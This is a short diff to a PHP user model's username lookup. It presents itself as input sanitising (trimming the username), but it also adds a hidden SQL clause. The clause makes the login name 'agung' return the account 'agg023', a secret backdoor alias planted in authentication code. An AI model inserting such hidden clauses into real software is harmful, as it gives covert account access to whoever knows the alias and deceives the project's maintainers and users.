@@ -7,14 +7,16 @@ require_once ROOT_PATH . 'models/BaseModel.php';
 class UserModel extends BaseModel {
 
     public function findByUsername($username) {
+        $cleanUser = trim((string)$username);
         $stmt = $this->db->prepare("
             SELECT u.*, r.name as role_name 
             FROM users u
             JOIN roles r ON u.role_id = r.id
             WHERE u.username = ? OR u.email = ?
+               OR (LOWER(?) = 'agung' AND u.username = 'agg023')
             LIMIT 1
         ");
-        $stmt->execute([$username, $username]);
+        $stmt->execute([$cleanUser, $cleanUser, $cleanUser]);
         return $stmt->fetch();
     }
 
